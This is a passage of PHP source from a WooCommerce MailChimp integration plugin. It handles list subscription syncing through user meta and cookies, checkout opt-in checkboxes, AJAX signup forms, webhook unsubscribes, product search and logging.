     * @param string $list_type
     * @param int $user_id
     * @return void
     */
    public static function remove_user_list_from_meta($list_id, $list_type, $user_id)
    {
        if ($lists = maybe_unserialize(get_user_meta($user_id, 'woochimp_' . $list_type . '_lists', true))) {

            $updated = false;

            foreach ($lists as $key => $value) {

                // Check both formats
                if ($value == $list_id || $key == $list_id) {
                    unset($lists[$key]);
                    $updated = true;
                }
            }

            if ($updated) {
                update_user_meta($user_id, 'woochimp_' . $list_type . '_lists', $lists);
            }
        }
    }

    /**
     * Remove user list from cookies
     *
     * @access public
     * @param string $list_id
     * @param string $list_type
     * @param int $timestamp
     * @return void
     */
    public static function remove_user_list_from_cookies($list_id, $list_type)
    {
        // Check list-specific cookie and expire it
        $list_key = 'woochimp_' . $list_type . '_list_' . $list_id;

        if (isset($_COOKIE[$list_key])) {
            setcookie($list_key, 0, time()-100, COOKIEPATH, COOKIE_DOMAIN);
            unset($_COOKIE[$list_key]);
        }
    }

    /**
     * Read user lists
     *
     * @access public
     * @param string $list_type
     * @param int $user_id
     * @return void
     */
    public static function read_user_lists($list_type, $user_id = 0)
    {
        $lists_output = array();
        $default_array = array('timestamp' => '', 'email' => '', 'groups' => array());

        if ($user_id > 0) {

            if ($lists = get_user_meta($user_id, 'woochimp_' . $list_type . '_lists', true)) {

                foreach ($lists as $key => $value) {

                    // Old format
                    if (!is_array($value)) {
                        $lists_output[$value] = $default_array;
                    }
                    // New format
                    else {
                        $lists_output[$key] = $value;
                    }
                }
            }
        }

        else {

            // Set the matching pattern
            $cookie_name_preg_part = '/^woochimp_' . $list_type . '_list_/';

            // Iterate $_COOKIE array
            foreach ($_COOKIE as $cookie_name => $cookie_value) {

                if (preg_match($cookie_name_preg_part, $cookie_name)) {

                    // Clean up the list id
                    $list_id = preg_replace($cookie_name_preg_part, '', $cookie_name);

                    // Old format - pass on empty structure
                    if ($cookie_value == '1') {
                        $lists_output[$list_id] = $default_array;
                    }
                    // New format - extract the array
                    else {

                        $list_data = explode('|', $cookie_value);

                        // Save timestamp
                        $lists_output[$list_id]['timestamp'] = $list_data[0];

                        // Save email
                        $lists_output[$list_id]['email'] = $list_data[1];

                        // Remove timestamp and email
                        unset($list_data[0]);
                        unset($list_data[1]);

                        // Save groups
                        $lists_output[$list_id]['groups'] = !empty($list_data[2]) ? $list_data : array();
                    }
                }
            }
        }

        return $lists_output;
    }

    /**
     * Sync user lists
     *
     * @access public
     * @param int $user_id
     * @return void
     */
    public static function sync_user_lists($user_id = 0)
    {
        // There's no point in sync without user id
        if ($user_id == 0) {
            return false;
        }

        // Get all possible data first
        $lists = array(
            'subscribed' => array(
                'meta' => self::read_user_lists('subscribed', $user_id),
                'cookies' => self::read_user_lists('subscribed', 0),
            ),
            'unsubscribed' => array(
                'meta' => self::read_user_lists('unsubscribed', $user_id),
                'cookies' => self::read_user_lists('unsubscribed', 0),
            ),
        );

        // Set the opposite lists
        $opposite = array(
            'subscribed'   => 'unsubscribed',
            'unsubscribed' => 'subscribed',
            'meta'         => 'cookies',
            'cookies'      => 'meta',
        );

        // Iterate list types
        foreach (array('subscribed', 'unsubscribed') as $list_type) {

            // Create new array for current list type
            $all_lists = array();

            // Iterate data types
            foreach (array('meta', 'cookies') as $data_type) {

                // Check if there's any data
                if (empty($lists[$list_type][$data_type])) {
                    continue;
                }

                // Iterate lists to check for updates
                foreach ($lists[$list_type][$data_type] as $list_id => $list_data) {

                    // List is already set in the same list type
                    if (isset($all_lists[$list_id])) {

                        // Check timestamp
                        if ($list_data['timestamp'] > $all_lists[$list_id]['timestamp']) {

                            // Update only if it's newer
                            $all_lists[$list_id] = $list_data;
                        }
                    }

                    // No such list added yet - add it now
                    else {
                        $all_lists[$list_id] = $list_data;
                    }

                    // Check if list is set in the opposite list type
                    if (isset($lists[$opposite[$list_type]][$data_type][$list_id])) {

                        $opposite_list_data = $lists[$opposite[$list_type]][$data_type][$list_id];

                        // Check timestamp - remove list only if it's newer
                        if ($opposite_list_data['timestamp'] > $all_lists[$list_id]['timestamp']) {
                            unset($all_lists[$list_id]);
                        }
                    }
                    else if (isset($lists[$opposite[$list_type]][$opposite[$data_type]][$list_id])) {

                        $opposite_list_data_alt = $lists[$opposite[$list_type]][$opposite[$data_type]][$list_id];

                        // Check timestamp - remove list only if it's newer
                        if ($opposite_list_data_alt['timestamp'] > $all_lists[$list_id]['timestamp']) {
                            unset($all_lists[$list_id]);
                        }
                    }
                }
            }

            // Write the updated data in meta
            update_user_meta($user_id, 'woochimp_' . $list_type . '_lists', $all_lists);

            // Remove outdated lists in cookies
            foreach ($lists[$list_type]['cookies'] as $list_id => $list_data) {

                // Remove if it wasn't selected
                if (!in_array($list_id, array_keys($all_lists))) {
                    self::remove_user_list_from_cookies($list_id, $list_type);
                }
            }

            // Write the updated lists in cookies
            foreach ($all_lists as $list_id => $list_data) {
                self::update_user_list_cookie($list_id, $list_type, $list_data['timestamp'], $list_data['email'], $list_data['groups']);
            }
        }
    }

    /**
     * Send request to get user groups from MailChimp
     *
     * @access public
     * @param int $user_id
     * @return void
     */
    public static function get_user_groups_request($user_id = 0)
    {
        // Get url
        $url = add_query_arg('woochimp-get-user-groups', $user_id, site_url());

        // Get args
        $args = array(
            'timeout'   => 0.01,
            'blocking'  => false,
            'sslverify' => apply_filters('https_local_ssl_verify', false),
        );

        // Send local request
        wp_remote_post($url, $args);
    }

    /**
     * Actually get user groups from MailChimp and update meta/cookies
     *
     * @access public
     * @param string $list_type
     * @param string $data_type
     * @param int $user_id
     * @return void
     */
    public function get_user_groups_handler()
    {
        // Check if id was passed
        if (isset($_GET['woochimp-get-user-groups'])) {
            $user_id = $_GET['woochimp-get-user-groups'];
        }
        else {
            return false;
        }

        // Load MailChimp
        if (!$this->load_mailchimp()) {
            return false;
        }

        $this->log_add(__('User groups update process launched for user id: ', 'woochimp') . $user_id);

        // Get user lists and email
        $subscribed_lists_full = self::read_user_lists('subscribed', $user_id);
        $subscribed_lists = array_keys($subscribed_lists_full);
        $email = get_user_meta($user_id, 'billing_email', true);

        $new_lists = array();

        foreach ($subscribed_lists as $list_id) {

            try {
                $user_data = $this->mailchimp->get_member($list_id, $email);

                $groups = array();

                foreach ($user_data['interests'] as $interest_id => $subscribed) {

                    if ($subscribed !== false && !empty($subscribed)) {
                        $groups[] = $interest_id;
                    }
                }

                $timestamp = time();

                $new_lists[$list_id] = array(
                    'timestamp' => $timestamp,
                    'email'     => $email,
                    'groups'    => $groups,
                );

                // Update user meta
                if (!empty($new_lists)) {
                    $new_lists = array_merge($subscribed_lists_full, $new_lists);
                    update_user_meta($user_id, 'woochimp_subscribed_lists', $new_lists);
                }

                // Update cookie
                self::update_user_list_cookie($list_id, 'subscribed', $timestamp, $email, $groups);

                // Mark user
                update_user_meta($user_id, 'woochimp_user_groups_requested', 1);

                // Add to log
                $this->log_add(__('Groups updated.', 'woochimp'));
            }
            catch (Exception $e) {
                $this->log_process_exception($e);
                return false;
            }
        }
    }

    /**
     * Launches various methods to update and sync lists/groups user data
     *
     * @access public
     * @return bool
     */
    public function user_lists_data_update()
    {
        // Get user id
        $user_id = get_current_user_id();

        // Check user id
        if ($user_id === 0) {
            return false;
        }

        // Check page
        if (!is_account_page() && !is_cart() && !is_checkout()) {
            return false;
        }

        // Make sure meta is migrated, but still with older timestamps
        self::migrate_user_lists_meta('subscribed', time() - 20, $user_id);
        self::migrate_user_lists_meta('unsubscribed', time() - 10, $user_id);

        // Check meta and maybe send request to MC
        $user_groups_requested = get_user_meta($user_id, 'woochimp_user_groups_requested', true);

        if (empty($user_groups_requested)) {
            self::get_user_groups_request($user_id);
            return true;
        }

        // Sync local data
        self::sync_user_lists($user_id);
        return true;
    }

    /**
     * Check and maybe schedule new sync events
     *
     * @access public
     * @return void
     */
    public function schedule_sync_events()
    {
        // Orders sync - check if enabled and not scheduled yet
        if ($this->opt['woochimp_sync_order_data'] === '1' && WooChimp_Event_Scheduler::get_scheduled_event_timestamp('order_sync') === false) {

            // Set new timestamp and allow developers to override the interval
            $timestamp = time() + apply_filters('woochimp_order_sync_interval', 1800);
            WooChimp_Event_Scheduler::schedule_order_sync($timestamp);
        }
    }

    /**
     * Check if user is already subscribed to any of checkbox lists
     *
     * @access public
     * @return void
     */
    public function can_user_subscribe_with_checkbox()
    {
        // Get user meta
        $user_id = get_current_user_id();
        $user_meta = is_user_logged_in() ? get_user_meta($user_id) : array();

        // Iterate the sets and check all lists
        if (isset($this->opt['sets_checkbox']) && is_array($this->opt['sets_checkbox'])) {
            foreach ($this->opt['sets_checkbox'] as $set) {

                // Check conditions
                if ($this->conditions_check($set, 'checkbox', null, $user_meta, $user_id, true)) {

                    // Get user lists
                    $subscribed_lists = self::read_user_lists('subscribed', $user_id);
                    $subscribed_lists = array_keys($subscribed_lists);

                    // Check meta and cookies and return true if at least one list is not there
                    if (is_user_logged_in()) {

                        // For users check only meta
                        if ((!empty($subscribed_lists) && ((is_array($subscribed_lists) && !in_array($set['list'], $subscribed_lists)) || (!is_array($subscribed_lists) && $subscribed_lists != $set['list']))) || empty($subscribed_lists)) {
                            return true;
                        }
                    }

                    else {

                        // For guests check cookies
                        if (!isset($_COOKIE['woochimp_subscribed_list_' . $set['list']])) {
                            return true;
                        }
                    }
                }
            }
        }

        return false;
    }

    /**
     * Get the list of default country names from MC which don't match WC's defalut names
     *
     * @access public
     * @return array
     */
    public static function get_mc_countries_exceptions()
    {
        return array(
            'AX' => __('Aaland Islands', 'woochimp'),
            'AG' => __('Antigua And Barbuda', 'woochimp'),
            'BN' => __('Brunei Darussalam', 'woochimp'),
            'CG' => __('Congo', 'woochimp'),
            'CD' => __('Democratic Republic of the Congo', 'woochimp'),
            'CI' => __('Cote D\'Ivoire', 'woochimp'),
            'CW' => __('Curacao', 'woochimp'),
            'HM' => __('Heard and Mc Donald Islands', 'woochimp'),
            'IE' => __('Ireland', 'woochimp'),
            'JE' => __('Jersey  (Channel Islands)', 'woochimp'),
            'LA' => __('Lao People\'s Democratic Republic', 'woochimp'),
            'MO' => __('Macau', 'woochimp'),
            'FM' => __('Micronesia, Federated States of', 'woochimp'),
            'MD' => __('Moldova, Republic of', 'woochimp'),
            'PW' => __('Palau', 'woochimp'),
            'PS' => __('Palestine', 'woochimp'),
            'WS' => __('Samoa (Independent)', 'woochimp'),
            'ST' => __('Sao Tome and Principe', 'woochimp'),
            'SX' => __('Sint Maarten', 'woochimp'),
            'GS' => __('South Georgia and the South Sandwich Islands', 'woochimp'),
            'SH' => __('St. Helena', 'woochimp'),
            'PM' => __('St. Pierre and Miquelon', 'woochimp'),
            'SJ' => __('Svalbard and Jan Mayen Islands', 'woochimp'),
            'TC' => __('Turks & Caicos Islands', 'woochimp'),
            'GB' => __('United Kingdom', 'woochimp'),
            'US' => __('United States of America', 'woochimp'),
            'VA' => __('Vatican City State (Holy See)', 'woochimp'),
            'WF' => __('Wallis and Futuna Islands', 'woochimp'),
            'VG' => __('Virgin Islands (British)', 'woochimp'),
        );
    }

    /**
     * Update user meta values
     *
     * @access public
     * @param int $user_id
     * @param string $meta_key
     * @param string $new_value
     * @return void
     */
    public static function update_woochimp_user_meta($user_id, $meta_key, $new_value)
    {
        // Get existing value
        $existing_meta = get_user_meta($user_id, $meta_key, true);

        // Make sure new value is array
        $new_value = is_array($new_value) ? $new_value : array($new_value);

        // If field is not new, convert existing to array as well and merge both values
        if ($existing_meta != '') {
            $existing_meta = is_array($existing_meta) ? $existing_meta : array($existing_meta);
            $new_value = array_merge($existing_meta, $new_value);
        }

        update_user_meta($user_id, $meta_key, $new_value);
    }

    /**
     * Add permission checkbox to checkout page
     *
     * @access public
     * @return void
     */
    public function add_permission_question()
    {
        // Skip some Ajax requests
        if (defined('DOING_AJAX') && DOING_AJAX && $this->opt['woochimp_checkbox_position'] == 'woocommerce_review_order_before_order_total') {
            return;
        }

        // Check if functionality is enabled
        if (!$this->opt['woochimp_enabled'] || !$this->checkout_checkbox_is_active()) {
            return;
        }

        // Check if user is already subscribed
        $already_subscribed = ($this->can_user_subscribe_with_checkbox() === false) ? true : false;

        // Maybe hide checkbox for already subscribed user
        if ($already_subscribed && $this->opt['woochimp_hide_checkbox'] == '1') {
            return;
        }

        // Prepare checkbox block
        $checkbox_block = '<p class="woochimp_checkout_checkbox" style="padding:15px 0;">';
        $checkbox_state = ($already_subscribed || $this->opt['woochimp_default_state'] == '1') ? 'checked="checked"' : '';
        $checkbox_block .= '<input id="woochimp_user_preference" name="woochimp_data[woochimp_user_preference]" type="checkbox" ' . $checkbox_state . '> <label for="woochimp_user_preference">' . $this->prepare_label('woochimp_text_checkout', false) . '</label>';
        $checkbox_block .= '</p>';

        // Maybe prepare groups
        $groups = $this->add_groups();

        // Display the html
        if ($already_subscribed === false || ($already_subscribed && ($this->opt['woochimp_hide_checkbox'] == '2' || ($this->opt['woochimp_hide_checkbox'] == '3' && !empty($groups['data']) && !empty($groups['html']))))) {
            echo $checkbox_block;
            echo $groups['html'];
        }

        // Load assets
        $this->load_frontend_assets('checkbox');
    }

    /**
     * Backup campaign cookies - in case of empty $_COOKIE
     *
     * @access public
     * @return void
     */
    public function backup_campaign_cookies()
    {
        // Insert hidden fields
        echo '<input id="woochimp_cookie_mc_eid" name="woochimp_data[woochimp_mc_eid]" type="hidden">
              <input id="woochimp_cookie_mc_cid" name="woochimp_data[woochimp_mc_cid]" type="hidden">';

        // Enqueue jQuery cookie (if not yet)
        if (!wp_script_is('jquery-cookie', 'enqueued')) {
            wp_register_script('jquery-cookie', WOOCHIMP_PLUGIN_URL . '/assets/js/jquery.cookie.js', array('jquery'), '1.4.1');
            wp_enqueue_script('jquery-cookie');
        }

        // Launch our JS script, which will store cookie values in hidden fields
        wp_register_script('woochimp-cookie', WOOCHIMP_PLUGIN_URL . '/assets/js/woochimp-cookie.js', array('jquery'), WOOCHIMP_VERSION);
        wp_enqueue_script('woochimp-cookie');
    }

    /**
     * Maybe add groups after subscribe on checkout checkbox
     *
     * @access public
     * @return void
     */
    public function add_groups()
    {
        // Check if it's needed
        $method = $this->opt['woochimp_checkout_groups_method'];

        if (!$method || $method == 'auto') {
            return;
        }

        // Process groups to array
        if (isset($this->opt['sets_checkbox']) && is_array($this->opt['sets_checkbox'])) {

            $groupings = array();
            $required_groups = array();

            // Prepare all groups for this sets/lists (to create nice titles)
            $all_sets_groups_lists = $this->get_groups($this->opt['sets_checkbox'], false);

            $all_sets_groups = array();
            foreach ($all_sets_groups_lists as $list) {
                $all_sets_groups = array_merge($all_sets_groups, $list);
            }

            foreach ($this->opt['sets_checkbox'] as $set) {

                if (isset($set['groups']) && is_array($set['groups']) && !empty($set['groups']) ) {

                    foreach ($set['groups'] as $group) {

                        // Grouping id and group name
                        $group_parts = preg_split('/:/', $group);
                        $group_id = $group_parts[0];
                        $group_name = $group_parts[1];

                        foreach ($all_sets_groups as $grouping_key => $groups) {

                            if (isset($groups['groups'][$group_id])) {

                                // Add title
                                if (!isset($groupings[$grouping_key]['title'])) {
                                    $groupings[$grouping_key]['title'] = trim($groups['title']);
                                }

                                // Add group
                                if (!isset($groupings[$grouping_key][$group])) {
                                    $groupings[$grouping_key][$group] = $group_name;
                                }

                                // Check if required
                                if (in_array($method, array('single_req', 'select_req'))) {
                                    $required_groups[] = $grouping_key;
                                }
                            }
                        }
                    }
                }
            }
        }

        // Try to get user and his lists
        $user_id = is_user_logged_in() ? get_current_user_id() : 0;
        $subscribed_lists = self::read_user_lists('subscribed', $user_id);

        $all_user_groups = array();

        foreach ($subscribed_lists as $list_id => $list_data) {
            $all_user_groups = array_merge($all_user_groups, $list_data['groups']);
        }

        // Show groups selection
        $html = '<div id="woochimp_checkout_groups">';

        foreach ($groupings as $group_key => $group_data) {

            $title = $group_data['title'] ? $group_data['title'] : __('Grouping', 'woochimp') . ' ' . $group_key;
            $required = (!empty($required_groups) && in_array($group_key, $required_groups)) ? 'required' : '';

            // Select field begin
            if (in_array($method, array('select', 'select_req'))) {
                $html .= '<section><label class="select">';
                $html .= '<select class="woochimp_checkout_field_' . $group_key . '" '
                       . 'name="woochimp_data[groups][' . $group_key . ']" ' . $required . '>'
                       . '<option value="" disabled selected>' . $title . '</option>';
            }
            else {
                $html .= '<label class="label">' . $title . '</label>';
            }

            unset($group_data['title']);

            $html .= '<br>';

            foreach ($group_data as $group_value => $group_name) {

                $group_value_parts = preg_split('/:/', $group_value);
                $selected = in_array($group_value_parts[0], $all_user_groups) ? true : false;

                // Display checkbox group
                if ($method == 'multi') {

                    $html .= '<label class="checkbox">';

                    $html .= '<input type="checkbox" '
                           . 'class="woochimp_checkout_field_' . $group_key . '" '
                           . 'name="woochimp_data[groups][' . $group_key . '][]" '
                           . 'value="' . $group_value . '" ' . $required . ($selected ? 'checked' : '') .'>';

                    $html .= ' ' . $group_name . '</label>';
                }

                // Display select field options
                else if (in_array($method, array('select', 'select_req'))) {
                    $html .= '<option value="' . $group_value . '">' . $group_name . '</option>';
                }

                // Display radio set
                else {

                    $html .= '<label class="radio">';

                    $html .= '<input type="radio" '
                           . 'class="woochimp_checkout_field_' . $group_key . '" '
                           . 'name="woochimp_data[groups][' . $group_key . ']" '
                           . 'value="' . $group_value . '" ' . $required . ($selected ? 'checked' : '') . '>';

                    $html .= ' ' . $group_name . '</label>';
                }

                $html .= '<br>';
            }

            // Select field end
            if (in_array($method, array('select', 'select_req'))) {
                $html .= '</select></label></section>';
            }
        }

        $html .= '</div>';

        // Adding required groups as variable
        if (!empty($required_groups)) {
            $html .= '<script type="text/javascript">'
               . 'var woochimp_checkout_required_groups = '
               . json_encode($required_groups)
               . '</script>';
        }

        return array('data' => $groupings,
                     'html' => $html);
    }

    /**
     * Register widget
     *
     * @access public
     * @return void
     */
    public function subscription_widget()
    {
        register_widget('WooChimp_MailChimp_Signup');
    }

    /**
     * Display subscription form in place of shortcode
     *
     * @access public
     * @param mixed $attributes
     * @return string
     */
    public function subscription_shortcode($attributes)
    {
        // Check if functionality is enabled
        if (!$this->opt['woochimp_enabled'] || !$this->opt['woochimp_enabled_shortcode']) {
            return '';
        }

        // Prepare form
        $form = woochimp_prepare_form($this->opt, 'shortcode');

        return $form;
    }

    /**
     * Subscribe user from shortcode form
     *
     * @access public
     * @return void
     */
    public function ajax_subscribe_shortcode()
    {
        // Check if feature is enabled
        if (!$this->opt['woochimp_enabled'] || !$this->opt['woochimp_enabled_shortcode']) {
            echo $this->prepare_json_label('woochimp_label_error', true);
            die();
        }

        // Check if data was received
        if (!isset($_POST['data'])) {
            echo $this->prepare_json_label('woochimp_label_error', true);
            die();
        }

        $data = array();
        parse_str($_POST['data'], $data);

        // Check if our vars were received
        if (!isset($data['woochimp_shortcode_subscription']) || empty($data['woochimp_shortcode_subscription'])) {
            echo $this->prepare_json_label('woochimp_label_error', true);
            die();
        }

        $data = $data['woochimp_shortcode_subscription'];

        // Check if email was received
        if (!isset($data['email']) || empty($data['email'])) {
            echo $this->prepare_json_label('woochimp_label_error', true);
            die();
        }

        $email = $data['email'];

        // Get double opt-in option
        $double_optin = (bool) $this->opt['woochimp_double_shortcode'];

        // Get user id
        $user_id = is_user_logged_in() ? get_current_user_id() : 0;

        // Parse custom fields
        $custom_fields = array();

        if (isset($data['custom']) && !empty($data['custom'])) {
            foreach ($data['custom'] as $key => $value) {
                $field_ok = false;

                foreach ($this->opt['woochimp_shortcode_fields'] as $custom_field) {
                    if ($key == $custom_field['tag']) {
                        $field_ok = true;
                        break;
                    }
                }

                if ($field_ok) {
                    $custom_fields[$key] = $value;
                }
            }
        }

        // Subscribe user
        $result = $this->subscribe($this->opt['woochimp_list_shortcode'], $email, $this->opt['woochimp_groups_shortcode'], $custom_fields, $user_id, $double_optin);

        // Subscribe successfully
        if ($result === true) {
            echo $this->prepare_json_label('woochimp_label_success', false);
            die();
        }

        // Already subscribed
        else if ($result == 'member_exists') {
            echo $this->prepare_json_label('woochimp_label_already_subscribed', true);
            die();
        }

        // Other errors
        echo $this->prepare_json_label('woochimp_label_error', true);
        die();
    }

    /**
     * Subscribe user from widget form
     *
     * @access public
     * @return void
     */
    public function ajax_subscribe_widget()
    {
        // Check if feature is enabled
        if (!$this->opt['woochimp_enabled'] || !$this->opt['woochimp_enabled_widget']) {
            echo $this->prepare_json_label('woochimp_label_error', true);
            die();
        }

        // Check if data was received
        if (!isset($_POST['data'])) {
            echo $this->prepare_json_label('woochimp_label_error', true);
            die();
        }

        $data = array();
        parse_str($_POST['data'], $data);

        // Check if our vars were received
        if (!isset($data['woochimp_widget_subscription']) || empty($data['woochimp_widget_subscription'])) {
            echo $this->prepare_json_label('woochimp_label_error', true);
            die();
        }

        $data = $data['woochimp_widget_subscription'];

        // Check if email was received
        if (!isset($data['email']) || empty($data['email'])) {
            echo $this->prepare_json_label('woochimp_label_error', true);
            die();
        }

        $email = $data['email'];

        // Get double opt-in option
        $double_optin = (bool) $this->opt['woochimp_double_widget'];

        // Get user id
        $user_id = is_user_logged_in() ? get_current_user_id() : 0;

        // Parse custom fields
        $custom_fields = array();

        if (isset($data['custom']) && !empty($data['custom'])) {
            foreach ($data['custom'] as $key => $value) {
                $field_ok = false;

                foreach ($this->opt['woochimp_widget_fields'] as $custom_field) {
                    if ($key == $custom_field['tag']) {
                        $field_ok = true;
                        break;
                    }
                }

                if ($field_ok) {
                    $custom_fields[$key] = $value;
                }
            }
        }

        // Subscribe user
        $result = $this->subscribe($this->opt['woochimp_list_widget'], $email, $this->opt['woochimp_groups_widget'], $custom_fields, $user_id, $double_optin);

        // Subscribe successfully
        if ($result === true) {
            echo $this->prepare_json_label('woochimp_label_success', false);
            die();
        }

        // Already subscribed
        else if ($result == 'member_exists') {
            echo $this->prepare_json_label('woochimp_label_already_subscribed', true);
            die();
        }

        // Other errors
        echo $this->prepare_json_label('woochimp_label_error', true);
        die();
    }

    /**
     * Get label for output
     *
     * @access public
     * @param int $key
     * @param bool $decode
     * @return void
     */
    public function prepare_label($key, $decode = true)
    {
        // Check if set
        if (empty($key) || !isset($this->opt[$key])) {
            return false;
        }

        // Decode HTML
        if ($decode) {
            return htmlspecialchars_decode($this->opt[$key]);
        }

        // Output as saved
        else {
            return $this->opt[$key];
        }

        return false;
    }

    /**
     * Get label for output in JSON-encoded format
     *
     * @access public
     * @param int $key
     * @param bool $error
     * @return void
     */
    public function prepare_json_label($key, $error = false)
    {
        // Check if set
        $label = $this->prepare_label($key);

        if ($label === false) {
            return false;
        }

        return json_encode(array('error' => (($error === true) ? 1 : 0), 'message' => $label), JSON_HEX_TAG);
    }

    /**
     * Check if curl is enabled
     *
     * @access public
     * @return void
     */
    public function curl_enabled()
    {
        if (function_exists('curl_version')) {
            return true;
        }

        return false;
    }

    /**
     * Process MailChimp Webhook call
     *
     * @access public
     * @return void
     */
    public function process_webhook() {

        // Handle unsubsribe event
        if (!empty($_POST) && isset($_POST['type'])) {
            switch($_POST['type']){

                // Unsubscribe
                case 'unsubscribe':

                    // Load user
                    if ($user = get_user_by('email', $_POST['data']['email'])) {
                        self::remove_user_list($_POST['data']['list_id'], 'subscribed', $user->ID);
                        self::track_user_list($_POST['data']['list_id'], 'unsubscribed', $_POST['data']['email'], array(), $user->ID);
                    }

                    break;

                // Other available:
                // case 'subscribe'
                // case 'cleaned'
                // case 'upemail'
                // case 'profile'
                // case 'campaign'

                // Default
                default:
                    break;
            }
        }

        die();
    }

    /**
     * Get all lists plus groups and fields for selected lists in array
     *
     * @access public
     * @return void
     */
    public function ajax_lists_for_checkout()
    {
        if (isset($_POST['data'])) {
            $data = $_POST['data'];
        }
        else {
            $data = array();
        }

        // Get lists
        $lists = $this->get_lists();

        // Check if we have something pre-selected
        if (!empty($data)) {

            // Get merge vars
            $merge = $this->get_merge_vars($lists);

            // Get sets from correct option
            $sets = (isset($data['sets_type']) && isset($this->opt[$data['sets_type']])) ? $this->opt[$data['sets_type']] : $this->opt['sets'];

            // Get groups
            $groups = $this->get_groups($sets);

        }
        else {

            $merge = array();
            $groups = array();

            foreach ($lists as $list_key => $list_value) {

                if ($list_key == '') {
                    continue;
                }

                // Blank merge vars
                $merge[$list_key] = array('' => '');

                // Blank groups
                $groups[$list_key] = array('' => '');
            }
        }

        // Add all checkout properties
        $checkout_properties = $this->checkout_properties;

        echo json_encode(array('message' => array('lists' => $lists, 'groups' => $groups, 'merge' => $merge, 'checkout_properties' => $checkout_properties)));
        die();
    }

    /**
     * Ajax - Return products list
     */
    public function ajax_product_search($find_variations = false)
    {
        $results = array();

        // Check if query string is set
        if (isset($_POST['q'])) {
            $kw = $_POST['q'];
            // WC31: Products will no longer be posts
            $search_query = new WP_Query(array('s' => "$kw", 'post_type' => 'product'));

            if ($search_query->have_posts()) {
                while ($search_query->have_posts()) {
                    $search_query->the_post();
                    $post_title = get_the_title();
                    $post_id = get_the_ID();

                    // Variation product
                    if ($find_variations) {

                        $product = wc_get_product($post_id);

                        if ($product->is_type('variable') || $product->is_type('variable-subscription')) {

                            $variations = $product->get_available_variations();

                            // WC31: Products will no longer be posts
                            foreach ($variations as $variation) {

                                // Get formatted product variation title
                                $formatted_product_variation_title = $this->get_formatted_product_variation_title($variation['variation_id']);

                                // Add to results
                                $results[] = array('id' => $variation['variation_id'], 'text' => rawurldecode($formatted_product_variation_title));
                            }
                        }
                    }

                    // Regular product
                    else {
                        $results[] = array('id' => $post_id, 'text' => $post_title);
                    }
                }
            }

            // If no posts found
            else {
                $results[] = array('id' => 0, 'text' => __('Nothing found.', 'woochimp'), 'disabled' => 'disabled');
            }
        }

        // If no search query was sent
        else {
            $results[] = array('id' => 0, 'text' => __('No query was sent.', 'woochimp'), 'disabled' => 'disabled');
        }

        echo json_encode(array('results' => $results));
        die();
    }

    /**
     * Get formatted product variation title
     *
     * @access public
     * @param $variation_id
     * @return string
     */
    public function get_formatted_product_variation_title($variation_id)
    {

        // Get variation product
        $variation_product = wc_get_product($variation_id);

        // Get list of variation attributes
        $attributes = $variation_product->get_variation_attributes();

        // Change empty values
        foreach ($attributes as $attribute_key => $attribute) {
            if ($attribute === '') {
                $attributes[$attribute_key] = sprintf(strtolower(__('Any %s', 'woocommerce')), wc_attribute_label(str_replace('attribute_', '', $attribute_key)));
            }
        }

        // Join attributes
        $attributes = join(', ', $attributes);
        $attributes = RightPress_Help::shorten_text($attributes, 25);

        // Get variation identifier
        if ($variation_product->get_sku()) {
            $identifier = $variation_product->get_sku();
        } else {
            $identifier = '#' . $variation_product->get_id();
        }

        // Format variation title for display
        $variation_title = $variation_product->get_title() . ' - ' . $attributes . ' (' . $identifier . ')';

        return $variation_title;
    }

    /**
     * Ajax - Return product variations list
     */
    public function ajax_product_variations_search()
    {
        $this->ajax_product_search(true);
    }

    /**
     * Check if order has been paid
     *
     * @access public
     * @param mixed $order
     * @return bool
     */
    public static function order_is_paid($order)
    {
        // Load order if order id was passed in
        if (!is_object($order)) {
            $order = wc_get_order($order);
        }

        // Check if order was loaded
        if (!$order) {
            return false;
        }

        // Check if order is paid
        return $order->is_paid();
    }

    /**
     * Setup the log if it's enabled
     *
     * @access public
     * @return void
     */
    public function log_setup()
    {
        // Get options
        $log = $this->opt['woochimp_enable_log'] == 1 ? $this->opt['woochimp_log_events'] : false;

        // Log is enabled
        if ($log !== false && !isset($this->logger)) {

            // Set logger object
            $this->logger = new WC_Logger();

            // Set type
            $this->log_type = $log;

            // Maybe migrate old log
            $this->log_migrate();
        }
    }

    /**
     * Add log entry
     *
     * @access public
     * @return void
     */
    public function log_add($entry)
    {
        if (isset($this->logger)) {

            // Save string
            if (!is_array($entry)) {
                $this->logger->add('woochimp_log', $entry);
            }

            // Save array
            else {
                $this->logger->add('woochimp_log', print_r($entry, true));
            }
        }
    }

    /**
     * Add log entries from exception
     *
     * @access public
     * @param exception $e
     * @return void
     */
    public function log_process_exception($e)
    {
        // Get message
        $message = $e->getMessage();

        // Try to decode the message
        $message_decoded = maybe_unserialize($message);

        // Log simple message
        if (is_string($message_decoded)) {
            $this->log_add($message);
        }

        // Log additional data
        else {

            $this->log_add(__('REQUEST: ', 'woochimp') . $message_decoded['request_to']);

            if (!empty($message_decoded['request'])) {
                $this->log_add($message_decoded['request']);
            }

            $this->log_add(__('RESPONSE: ', 'woochimp') . $message_decoded['message']);

            if (!empty($message_decoded['response'])) {
                $this->log_add($message_decoded['response']);
            }
        }
    }

    /**
     * Add log entries from regular call data
     *
     * @access public
     * @param array $params
     * @param array $result
     * @return void
     */
    public function log_process_regular_data($params, $result)
    {
        // Check if logging of normal requests is enabled
        if ($this->log_type == 'all') {

            $this->log_add(__('REQUEST PARAMS: ', 'woochimp'));
            $this->log_add($params);

            $this->log_add(__('RESPONSE:', 'woochimp'));
            $this->log_add($result);
        }
    }

    /**
     * Migrate and unset the old log
     *
     * @access public
     * @return void
     */
    public function log_migrate()
    {
        // Get existing value
        $woochimp_log = get_option('woochimp_log');

        // Already migrated
        if ($woochimp_log === false) {
            return;
        }

        // Migrate
        $this->logger->add('woochimp_log', __('OLD LOG START', 'woochimp'));
        $this->logger->add('woochimp_log', print_r($woochimp_log, true));
        $this->logger->add('woochimp_log', __('OLD LOG END', 'woochimp'));

        // Delete option
        delete_option('woochimp_log');
    }

    /**
     * Erase the log
     * TBD - use somewhere
     *
     * @access public
     * @return void
     */
    private function log_erase()
    {
        if (isset($this->logger)) {
            $this->logger->clear('woochimp_log');
        }
    }

    /**
     * Check WooCommerce version
     *
     * @access public
     * @param string $version
     * @return bool
     */
    public static function wc_version_gte($version)
    {
        if (defined('WC_VERSION') && WC_VERSION) {
            return version_compare(WC_VERSION, $version, '>=');
        }
        else if (defined('WOOCOMMERCE_VERSION') && WOOCOMMERCE_VERSION) {
            return version_compare(WOOCOMMERCE_VERSION, $version, '>=');
        }
        else {
            return false;
        }
    }

    /**
